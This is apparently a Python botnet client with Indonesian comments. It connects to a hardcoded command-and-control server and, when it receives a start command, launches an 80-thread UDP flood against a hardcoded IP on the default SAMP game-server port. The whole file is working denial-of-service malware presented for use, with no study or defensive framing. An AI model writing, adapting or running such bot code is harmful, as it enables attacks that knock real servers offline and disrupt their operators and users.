import socket
import random
import threading
import time

# Fungsi untuk mengirimkan paket UDP ke server SAMP
def attack_udp(target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        # Membuat data acak berukuran besar
        packet_size = random.randint(1024, 4096)  # Mengirimkan paket antara 1KB hingga 4KB
        packet = bytearray(random.getrandbits(8) for _ in range(packet_size))  # Paket acak
        sock.sendto(packet, (target_ip, target_port))
        print(f"[ATTACK] Mengirimkan {packet_size} bytes ke {target_ip}:{target_port}")

# Fungsi untuk menjalankan serangan dengan banyak thread
def start_attack(target_ip, target_port, num_threads):
    threads = []
    
    # Membuat banyak thread untuk serangan yang lebih ganas
    for _ in range(num_threads):
        thread = threading.Thread(target=attack_udp, args=(target_ip, target_port))
        thread.start()
        threads.append(thread)
    
    # Tunggu semua thread selesai (meskipun dalam serangan, mereka terus berjalan)
    for thread in threads:
        thread.join()

# Koneksi ke server C&C untuk menerima perintah
def connect_to_cc_server():
    bot_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    bot_socket.connect(("114.10.19.54", 8080))  # Ganti dengan IP server C&C Anda
    
    while True:
        command = bot_socket.recv(1024).decode('utf-8')
        
        if command == "Serangan Dimulai!":
            print("[INFO] Mulai serangan!")
            # Dimulai dengan serangan UDP
            target_ip = "54.179.180.138"  # Ganti dengan IP server SAMP target
            target_port = 7000        # Port default SAMP
            num_threads = 80          # Menggunakan 50 thread untuk serangan
            start_attack(target_ip, target_port, num_threads)
        
        elif command == "Serangan Dihentikan!":
            print("[INFO] Serangan dihentikan!")
            break
        else:
            print(f"[INFO] Perintah tidak dikenali: {command}")
        
        time.sleep(1)

if __name__ == "__main__":
    connect_to_cc_server()